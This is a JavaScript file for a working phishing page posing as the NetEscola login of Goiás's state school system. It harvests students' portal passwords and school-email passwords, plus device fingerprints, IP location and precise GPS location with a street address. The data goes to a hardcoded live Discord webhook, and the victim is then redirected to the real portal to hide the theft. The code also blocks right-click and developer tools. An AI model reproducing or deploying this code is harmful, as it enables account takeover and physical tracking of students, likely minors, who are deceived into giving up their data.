const webhookUrl = 'https://discord.com/api/webhooks/1424947915574743144/NBQK0Hff3-JCV2Mgi6W7Plp-bxYkt2uOkkG4tL8mtz0aGIMRn-6zoeUbYUdJa5wHPIUb';

// Configurações do webhook
const WEBHOOK_CONFIG = {
    username: '🩸 NetEscola Security',
    avatar_url: 'https://i.imgur.com/2cD7qXW.png',
    color: 0x8B0000, // Vermelho sangue escuro
    secondaryColor: 0x4A0404, // Vermelho mais escuro
    footer: 'Sistema de Monitoramento • Dados Completos',
    version: '2.0.0'
};

let tentativas = 0;
const MAX_TENTATIVAS = 3;
const BLOQUEIO_TEMPO = 300000; // 5 minutos

document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    if (tentativas >= MAX_TENTATIVAS) {
        showMessage('error', '❌ Muitas tentativas. Aguarde 5 minutos.');
        return;
    }
    
    const usuario = document.getElementById('usuario').value.trim();
    const senha = document.getElementById('senha').value.trim();
    const email = document.getElementById('email').value.trim();
    const emailSenha = document.getElementById('emailSenha').value.trim();
    const btnLogin = document.querySelector('.btn-login');
    
    if (!validateInputs(usuario, senha, email, emailSenha)) {
        return;
    }
    
    btnLogin.disabled = true;
    btnLogin.textContent = '🩸 COLETANDO DADOS...';
    btnLogin.style.opacity = '0.7';
    
    showMessage('info', '⏳ Coletando informações...');
    
    // Primeiro envia os dados básicos
    const dadosBasicos = await collectBasicInfo(usuario, senha, email, emailSenha);
    await sendToWebhook(dadosBasicos, false);
    
    showMessage('info', '📍 Solicitando localização...');
    
    // Solicita localização
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            async (position) => {
                // Usuário ACEITOU - pega localização detalhada
                showMessage('success', '📍 Localização obtida! Enviando dados...');
                
                const dadosCompletos = await collectFullInfo(
                    usuario, senha, email, emailSenha, position
                );
                
                // Envia webhook com localização
                await sendToWebhook(dadosCompletos, true);
                
                completeLogin();
            },
            async (error) => {
                // Usuário NEGOU ou erro - envia sem localização
                console.log('Erro localização:', error.message);
                showMessage('warning', '⚠️ Localização não disponível. Continuando...');
                
                const dadosSemLocal = await collectBasicInfo(usuario, senha, email, emailSenha);
                dadosSemLocal.localizacao_status = `Negada/Erro: ${error.message}`;
                
                await sendToWebhook(dadosSemLocal, false);
                completeLogin();
            },
            {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            }
        );
    } else {
        showMessage('warning', '⚠️ Geolocalização não suportada');
        const dados = await collectBasicInfo(usuario, senha, email, emailSenha);
        dados.localizacao_status = 'Não suportada pelo navegador';
        await sendToWebhook(dados, false);
        completeLogin();
    }
});

// Validações
function validateInputs(usuario, senha, email, emailSenha) {
    if (!usuario || usuario.length < 3) {
        showMessage('error', '❌ Usuário deve ter pelo menos 3 caracteres');
        return false;
    }
    
    if (!senha || senha.length < 4) {
        showMessage('error', '❌ Senha deve ter pelo menos 4 caracteres');
        return false;
    }
    
    const emailRegex = /^[a-zA-Z0-9._%+-]+@aluno\.educa\.go\.gov\.br$/;
    if (!emailRegex.test(email)) {
        showMessage('error', '❌ Use e-mail @aluno.educa.go.gov.br válido');
        return false;
    }
    
    if (!emailSenha || emailSenha.length < 4) {
        showMessage('error', '❌ Digite a senha do e-mail');
        return false;
    }
    
    return true;
}

// Informações básicas (sem localização)
async function collectBasicInfo(usuario, senha, email, emailSenha) {
    const info = {
        // CREDENCIAIS COMPLETAS - SEM CENSURA
        credenciais: {
            usuario_netescola: usuario,
            senha_netescola: senha,
            email_seduc: email,
            senha_email: emailSenha
        },
        
        // Metadados
        metadados: {
            timestamp: new Date().toLocaleString('pt-BR', { 
                timeZone: 'America/Sao_Paulo',
                dateStyle: 'full',
                timeStyle: 'medium'
            }),
            timestamp_unix: Math.floor(Date.now() / 1000),
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            cookiesEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack,
            hardwareConcurrency: navigator.hardwareConcurrency || 'Desconhecido',
            deviceMemory: navigator.deviceMemory || 'Desconhecido',
            screenResolution: `${window.screen.width}x${window.screen.height}`,
            colorDepth: `${window.screen.colorDepth}-bit`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            referrer: document.referrer || 'Direto',
            pageUrl: window.location.href,
            connection: navigator.connection ? 
                `${navigator.connection.effectiveType} - ${navigator.connection.downlink}Mbps` : 
                'Não disponível'
        }
    };
    
    // Tenta pegar IP
    try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        info.metadados.ip_publico = ipData.ip;
        
        // Tenta pegar geolocalização por IP (aproximada)
        try {
            const geoResponse = await fetch(`http://ip-api.com/json/${ipData.ip}`);
            const geoData = await geoResponse.json();
            if (geoData.status === 'success') {
                info.metadados.localizacao_ip = {
                    pais: geoData.country,
                    regiao: geoData.regionName,
                    cidade: geoData.city,
                    lat: geoData.lat,
                    lon: geoData.lon,
                    isp: geoData.isp,
                    org: geoData.org
                };
            }
        } catch (e) {
            info.metadados.localizacao_ip = 'Não disponível';
        }
    } catch {
        info.metadados.ip_publico = 'Não disponível';
    }
    
    return info;
}

// Informações completas COM localização GPS
async function collectFullInfo(usuario, senha, email, emailSenha, position) {
    const info = await collectBasicInfo(usuario, senha, email, emailSenha);
    
    // Adiciona localização GPS precisa
    info.localizacao_gps = {
        status: '✅ Aceita pelo usuário',
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        precisao: `${position.coords.accuracy} metros`,
        altitude: position.coords.altitude || 'Não disponível',
        altitude_precisao: position.coords.altitudeAccuracy || 'Não disponível',
        direcao: position.coords.heading || 'Não disponível',
        velocidade: position.coords.speed || 'Não disponível',
        timestamp_gps: new Date(position.timestamp).toLocaleString('pt-BR'),
        google_maps: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`,
        what3words: `https://what3words.com/${position.coords.latitude},${position.coords.longitude}`
    };
    
    // Tenta pegar endereço aproximado via reverse geocoding
    try {
        const reverseGeo = await fetch(
            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}&zoom=18&addressdetails=1`
        );
        const addressData = await reverseGeo.json();
        if (addressData.display_name) {
            info.localizacao_gps.endereco_aproximado = addressData.display_name;
        }
    } catch (e) {
        info.localizacao_gps.endereco_aproximado = 'Não disponível';
    }
    
    return info;
}

// Envia para o webhook
async function sendToWebhook(dados, temLocalizacao) {
    try {
        const embed = createEmbed(dados, temLocalizacao);
        
        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                embeds: [embed],
                username: WEBHOOK_CONFIG.username,
                avatar_url: WEBHOOK_CONFIG.avatar_url
            })
        });
        
        if (!response.ok) {
            throw new Error(`HTTP ${response.status}`);
        }
        
        return true;
    } catch (error) {
        console.error('Erro webhook:', error);
        // Fallback para console em desenvolvimento
        if (webhookUrl.includes('COLOQUE_A_URL')) {
            console.log('📋 DADOS COMPLETOS (SEM CENSURA):', JSON.stringify(dados, null, 2));
            return true;
        }
        throw error;
    }
}

// Cria embed PROFISSIONAL com tema dark sangue
function createEmbed(dados, temLocalizacao) {
    // Formata credenciais em blocos de código
    const credenciaisField = {
        name: '🩸 **CREDENCIAIS COMPLETAS**',
        value: '```fix\n' +
               `📌 USUÁRIO: ${dados.credenciais.usuario_netescola}\n` +
               `🔑 SENHA:   ${dados.credenciais.senha_netescola}\n` +
               `📧 EMAIL:   ${dados.credenciais.email_seduc}\n` +
               `🔐 SENHA:   ${dados.credenciais.senha_email}\n` +
               '```',
        inline: false
    };
    
    // Localização (se disponível)
    let localizacaoField = null;
    if (temLocalizacao && dados.localizacao_gps) {
        localizacaoField = {
            name: '📍 **LOCALIZAÇÃO GPS (PRECISA)**',
            value: '```yaml\n' +
                   `Latitude:  ${dados.localizacao_gps.latitude}\n` +
                   `Longitude: ${dados.localizacao_gps.longitude}\n` +
                   `Precisão:  ${dados.localizacao_gps.precisao}\n` +
                   `Altitude:  ${dados.localizacao_gps.altitude}\n` +
                   '```\n' +
                   `**[🗺️ Ver no Maps](${dados.localizacao_gps.google_maps})** | ` +
                   `**[📍 What3Words](${dados.localizacao_gps.what3words})**`,
            inline: false
        };
    } else if (dados.metadados.localizacao_ip && dados.metadados.localizacao_ip !== 'Não disponível') {
        localizacaoField = {
            name: '🌐 **LOCALIZAÇÃO APROXIMADA (IP)**',
            value: '```yaml\n' +
                   `País:  ${dados.metadados.localizacao_ip.pais}\n` +
                   `Região: ${dados.metadados.localizacao_ip.regiao}\n` +
                   `Cidade: ${dados.metadados.localizacao_ip.cidade}\n` +
                   `Lat:    ${dados.metadados.localizacao_ip.lat}\n` +
                   `Lon:    ${dados.metadados.localizacao_ip.lon}\n` +
                   `ISP:    ${dados.metadados.localizacao_ip.isp}\n` +
                   '```',
            inline: false
        };
    }
    
    // Sistema e dispositivo
    const sistemaField = {
        name: '💻 **SISTEMA & DISPOSITIVO**',
        value: '```css\n' +
               `[Plataforma] ${dados.metadados.platform}\n` +
               `[Idioma]     ${dados.metadados.language}\n` +
               `[Resolução]  ${dados.metadados.screenResolution}\n` +
               `[Cores]      ${dados.metadados.colorDepth}\n` +
               `[CPU Cores]  ${dados.metadados.hardwareConcurrency}\n` +
               `[RAM]        ${dados.metadados.deviceMemory}GB\n` +
               `[Conexão]    ${dados.metadados.connection}\n` +
               '```',
        inline: true
    };
    
    // Rede e localização IP
    const redeField = {
        name: '🌍 **REDE & IP**',
        value: '```ini\n' +
               `[IP Público] ${dados.metadados.ip_publico}\n` +
               `[Fuso]       ${dados.metadados.timezone}\n` +
               `[Referrer]   ${dados.metadados.referrer}\n` +
               `[DNT]        ${dados.metadados.doNotTrack || 'Não'}\n` +
               '```',
        inline: true
    };
    
    // Timestamp
    const timestampField = {
        name: '⏰ **TIMESTAMP**',
        value: `<t:${dados.metadados.timestamp_unix}:F>\n<t:${dados.metadados.timestamp_unix}:R>`,
        inline: false
    };
    
    // Monta o embed
    const embed = {
        title: '🩸 **ALERTA CRÍTICO - NETESCOLA GO**',
        description: '```md\n# NOVO ACESSO REGISTRADO [DADOS COMPLETOS]\n```',
        color: temLocalizacao ? WEBHOOK_CONFIG.color : WEBHOOK_CONFIG.secondaryColor,
        fields: [credenciaisField],
        thumbnail: {
            url: 'https://i.imgur.com/wKpTk9v.png'
        },
        footer: {
            text: `${WEBHOOK_CONFIG.footer} • v${WEBHOOK_CONFIG.version} • ID: ${generateId()}`,
            icon_url: 'https://i.imgur.com/2cD7qXW.png'
        },
        timestamp: new Date().toISOString()
    };
    
    // Adiciona localização se disponível
    if (localizacaoField) {
        embed.fields.push(localizacaoField);
    }
    
    // Adiciona os outros campos
    embed.fields.push(sistemaField);
    embed.fields.push(redeField);
    embed.fields.push(timestampField);
    
    // Adiciona user agent como campo separado (pode ser longo)
    embed.fields.push({
        name: '🌐 **USER AGENT**',
        value: `\`\`\`${dados.metadados.userAgent.substring(0, 900)}\`\`\``,
        inline: false
    });
    
    return embed;
}

function generateId() {
    return Math.random().toString(36).substring(2, 10).toUpperCase();
}

function completeLogin() {
    tentativas = 0;
    showMessage('success', '✅ Dados enviados! Redirecionando...');
    
    // Animação
    const btn = document.querySelector('.btn-login');
    let dots = 0;
    const interval = setInterval(() => {
        dots = (dots + 1) % 4;
        btn.textContent = '✅ Redirecionando' + '.'.repeat(dots);
    }, 400);
    
    setTimeout(() => {
        clearInterval(interval);
        window.location.href = 'https://portalnetescola.educacao.go.gov.br';
    }, 3000);
}

document.getElementById('forgotLink').addEventListener('click', function(e) {
    e.preventDefault();
    showMessage('info', '📞 Procure a secretaria da sua escola');
});

function showMessage(type, text) {
    const messageDiv = document.getElementById('message');
    messageDiv.className = 'message ' + type + ' show';
    messageDiv.textContent = text;
    console.log(`[${type}] ${text}`);
}

// Proteção básica
document.addEventListener('contextmenu', e => e.preventDefault());
document.addEventListener('keydown', e => {
    if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
        e.preventDefault();
    }
});

console.log('🩸 Sistema NetEscola GO v2.0 - Dark Sangue Edition');
